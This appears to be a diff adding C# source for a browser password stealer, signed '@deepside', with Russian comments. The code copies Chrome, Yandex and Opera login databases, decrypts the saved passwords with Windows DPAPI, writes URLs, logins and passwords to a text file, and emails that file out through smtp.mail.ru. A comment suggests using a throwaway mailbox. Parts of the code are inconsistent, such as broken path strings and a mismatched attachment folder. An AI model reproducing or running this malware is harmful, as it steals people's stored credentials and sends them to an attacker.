@@ -1,0 +1,102 @@
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Mail;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Stealer
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Directory.CreateDirectory(Path.GetTempPath() + "StealLog");
+
+            string[] paths = {
+                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data",
+                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Yandex\YandexBrowser\User Data\Default\Login Data",
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable\Login Data"
+            };
+            string pwd_text = "";
+
+            foreach (string p in paths) //идем по папкам
+            {
+                var pas = Passwords.ReadPass(p);
+                if (File.Exists(p)) // если файл с паролями существует, то выполняем следующие действия
+                {
+                    pwd_text += "Stealer by: @deepside\r\n\r\n";
+                    foreach (var item in pas)
+                    {
+                        if ((item.Item2.Length > 0) && (item.Item2.Length > 0)) // если значения логина и пароля не пустые, то заносим их в переменную 
+                        {
+                            pwd_text += "URL: " + item.Item1 + "\r\n" + "Login: " + item.Item2 + "\r\n" + "Password: " + item.Item3 + "\r\n";
+                            pwd_text += " \r\n";
+                        }
+                    }
+                }
+            }
+            if (File.Exists(Path.GetTempPath() + @"StealLog
+            \Login Data"))
+            {
+                File.Delete(Path.GetTempPath() + @"StealLog
+             \Login Data");
+            }
+            File.WriteAllText(Path.GetTempPath() + @"StealLog
+            \Passwords.txt", pwd_text);
+
+            SmtpClient Smtp = new SmtpClient("smtp.mail.ru", 587); // Создаём Smpt соединения с почтой mail.tu
+
+            Smtp.Credentials = new NetworkCredential("", ""); // Меняем на своё, можно создать левую почту.
+
+            Smtp.EnableSsl = true;
+            MailMessage Message = new MailMessage();
+            Message.From = new MailAddress(""); // Кому отправляем
+            Message.To.Add("");
+            Message.Subject = ""; // Заголовок письма
+            Message.Body = ""; // Текст письма
+            Message.Attachments.Add(new Attachment(Path.GetTempPath() + @"RebornExodus\Passwords.txt")); // Добавляем вложение с логом
+            Smtp.Send(Message);
+        }
+
+        class Passwords
+        {
+            static public IEnumerable<Tuple<string, string, string>> ReadPass(string dbPath)
+            {
+                if (File.Exists(Path.GetTempPath() + @"StealLog\Login Data"))    // Если файл по данному пути существует, то удаляем его
+                {
+                    File.Delete(Path.GetTempPath() + @"StealLog\Login Data");
+                }
+                File.Copy(dbPath, Path.GetTempPath() + @"StealLog\Login Data");      // копируем файл с паролями для того, чтобы не закрывать браузер
+                dbPath = Path.GetTempPath() + @"StealLog\Login Data";
+                var connectionString = "Data Source=" + dbPath + ";pooling=false";
+                using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
+                using (var cmd = conn.CreateCommand())
+                {
+
+
+                    cmd.CommandText = "SELECT password_value,username_value,origin_url FROM logins";
+
+                    conn.Open();
+                    using (var reader = cmd.ExecuteReader())
+                    {
+                        while (reader.Read())
+                        {
+                            var encryptedData = (byte[])reader[0];
+
+                            var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);   // расшифровка паролей
+                            var plainText = Encoding.ASCII.GetString(decodedData);
+
+                            yield return Tuple.Create(reader.GetString(2), reader.GetString(1), plainText);
+
+                        }
+
+                    }
+                    conn.Close();
+                }
+            }
+        }
+    }
+}
